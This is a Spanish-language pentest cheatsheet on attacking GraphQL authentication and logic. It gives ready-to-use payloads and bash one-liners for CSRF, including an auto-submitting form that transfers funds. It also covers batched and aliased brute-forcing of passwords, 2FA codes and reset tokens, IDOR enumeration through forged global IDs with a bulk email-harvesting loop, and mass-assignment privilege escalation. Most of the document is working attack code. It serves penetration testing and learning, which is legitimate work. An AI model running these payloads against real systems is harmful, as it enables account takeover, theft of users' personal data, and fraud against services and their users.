---
aliases:
  - GraphQL CSRF
  - Query Batching
  - GraphQL IDOR
  - GraphQL Mass Assignment
tags:
  - type/cheatsheet
  - vuln/graphql
  - vuln/auth-bypass
  - vuln/csrf
  - vuln/idor
  - technique/initial-access
  - technique/privilege-escalation
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[GraphQL Injection]]'
  - '[[Cross-Site Request Forgery (CSRF)]]'
  - '[[BOLA - IDOR]]'
---
# GraphQL - Auth y Lógica

***

## CSRF en GraphQL

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<form enctype="text/plain" action="https://target/graphql"><input name='{"query":"mutation{deleteUser(id:1)}","_x":"' value='"}'>` | Body genera JSON parseable cross-origin | Engine tolera content-type errors. |
| `<img src="https://target/graphql?query=mutation{deleteUser(id:1)}">` | GET-based mutation trigger | Si engine acepta GET con queries (anti-pattern Apollo v2). |
| `<form action="https://target/graphql"><input name="query" value="mutation{deleteUser(id:1)}"></form>` | x-www-form-urlencoded CSRF | Engine acepta form-encoded body. |
| `curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'query=mutation{deleteUser(id:1)}' https://target/graphql` | Confirma form-encoded acepta | Pre-CSRF check. |
| `curl 'https://target/graphql?query={__typename}'` | GET method support check | Si funciona → vector CSRF GET. |
| `curl -X POST -H "Content-Type: text/plain" -d '{"query":"{__typename}"}' https://target/graphql` | text/plain Content-Type check | Si parsea → CSRF text/plain. |
^graphql-auth-csrf

### CSRF PoC GraphQL (text/plain trick)

```html
<form action="https://target.com/graphql" method="POST" enctype="text/plain">
  <input name='{"query":"mutation{transferFunds(to:\"attacker\",amount:1000)}","_":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

Body literal: `{"query":"mutation{transferFunds(to:\"attacker\",amount:1000)}","_":"=" }`. Backend parsea JSON con tolerancia → mutation con cookies de la victim.

___

## Query Batching para Bypass Rate Limit / Auth

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `[{"query":"mutation{login(u:\"a\",p:\"1\")}"},{"query":"mutation{login(u:\"a\",p:\"2\")}"}]` | Multiple ops single request | Rate limit por request — no por op. |
| `{"query":"{a:login(u:\"x\",p:\"1\"){token} b:login(u:\"x\",p:\"2\"){token}}"}` | Aliases bruteforce login | Equivalente a batch sin spec batch. |
| `{"query":"{a:verify2FA(code:\"0001\"){ok} b:verify2FA(code:\"0002\"){ok} ...}"}` | Brute 4-dígitos 2FA en single request | OTP race + rate limit bypass. |
| `{"query":"{a:resetPwd(token:\"a\"){ok} b:resetPwd(token:\"b\"){ok}}"}` | Brute reset tokens | Si tokens son cortos. |
| Generar batch con bash loop → `curl ... -d "$BATCH"` | Brute 100-1000 attempts en 1 request | Ver code block. |
^graphql-auth-batching

### Batch bruteforce login (bash one-liner)

```bash
# Genera batch con 100 passwords desde wordlist y manda en 1 request
BATCH=$(awk 'NR<=100 {printf "{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"%s\\\"){token}}\"}",$1; if(NR<100)printf ","}' rockyou.txt)
curl -X POST -H "Content-Type: application/json" -d "[$BATCH]" https://target/graphql | jq '.[] | select(.data.login.token != null)'
```

### Aliases bruteforce 2FA

```bash
# Genera 10000 aliases con códigos OTP 0000-9999
QUERY='{'
for i in $(seq -w 0 9999); do
  QUERY+="a${i}:verify2FA(code:\"${i}\"){success} "
done
QUERY+='}'
curl -X POST -H "Content-Type: application/json" -d "{\"query\":\"$QUERY\"}" https://target/graphql | jq '.. | .success? | select(. == true)'
```

___

## IDOR via Global IDs

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `echo "VXNlcjox" \| base64 -d` | Decode global ID → `User:1` | Discover format del ID. |
| `echo -n "User:42" \| base64` | Forge global ID arbitrario | Probe IDs ajenos. |
| `{"query":"{node(id:\"VXNlcjo0Mg==\"){...on User{email phone}}}"}` | Lee user 42 con global ID forjado | Relay-style schema. |
| `{"query":"{user(id:42){email phoneNumber address}}"}` | IDOR numeric directo | App usa integers. |
| `{"query":"mutation{deleteUser(id:42)}"}` | Delete sin owner check | Mutation IDOR. |
| `{"query":"{users(ids:[1,2,3,4,5,6,7,8,9,10]){email}}"}` | Bulk IDOR via array arg | Schema acepta lista. |
| `for i in {1..1000}; do echo -n "User:$i" \| base64; done` | Genera lista global IDs | Wordlist para fuzz. |
| `ffuf -u https://target/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{node(id:\"FUZZ\"){...on User{email}}}"}' -w ids.txt -mr 'email'` | Fuzz IDs y detecta hits | Bulk discovery. |
| `{"query":"{order(id:42,tenantId:1){items}}"}` con `tenantId` cambiado | Cross-tenant IDOR | Multi-tenant sin enforce. |
^graphql-auth-idor

### Bulk IDOR enumeration (bash loop)

```bash
# Enumerar emails de users 1-1000 via global IDs
for i in $(seq 1 1000); do
  ID=$(echo -n "User:$i" | base64)
  EMAIL=$(curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"query\":\"{node(id:\\\"$ID\\\"){...on User{email}}}\"}" \
    https://target/graphql | jq -r '.data.node.email // empty')
  [ -n "$EMAIL" ] && echo "$i: $EMAIL"
done
```

___

## Mass Assignment via Mutations

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"{__type(name:\"UserInput\"){inputFields{name type{name}}}}"}` | Lista todos los campos del input type | Pre-explotación — discover hidden fields. |
| `{"query":"mutation{updateUser(input:{name:\"x\",isAdmin:true}){id}}"}` | Privesc via isAdmin field | Field no filtrado en backend. |
| `{"query":"mutation{updateUser(input:{role:\"admin\"}){id}}"}` | Privesc via role string | Role como string. |
| `{"query":"mutation{updateProfile(input:{user_id:1,...}){id}}"}` | Hijack ownership | user_id no enforced server-side. |
| `{"query":"mutation{transfer(input:{amount:-1000000,balance:99999999}){id}}"}` | Negative transfer / forge balance | Financial bypass. |
| `{"query":"mutation{register(input:{email:\"x@y.z\",emailVerified:true}){id}}"}` | Bypass email verification | Verified flag mutable. |
| `{"query":"mutation{createPost(input:{title:\"x\",createdBy:1,createdAt:\"2020-01-01\"}){id}}"}` | Forge audit trail | Backdating. |
| `{"query":"mutation{updateDoc(input:{...,isPublic:true}){id}}"}` | Visibility hijack | Public flag mutable. |
| `{"query":"mutation{updateUser(input:{...,permissions:[\"admin:*\"]}){id}}"}` | Inject permissions array | RBAC bypass. |
^graphql-auth-mass-assign

### Mass assignment workflow

```bash
# 1. Introspection del input type
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__type(name:\"UserUpdateInput\"){inputFields{name type{name}}}}"}' \
  https://target/graphql | jq '.data.__type.inputFields'

# 2. Identificar campos sensibles en output:
#    - isAdmin, role, permissions, scopes
#    - user_id, owner_id, tenant_id
#    - email_verified, mfa_enabled, account_locked
#    - balance, credits, points, quota
#    - created_at, deleted_at, expires_at

# 3. Inject en mutation
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(input:{name:\"harmless\",isAdmin:true,role:\"superadmin\"}){id role isAdmin}}"}' \
  https://target/graphql
```

***
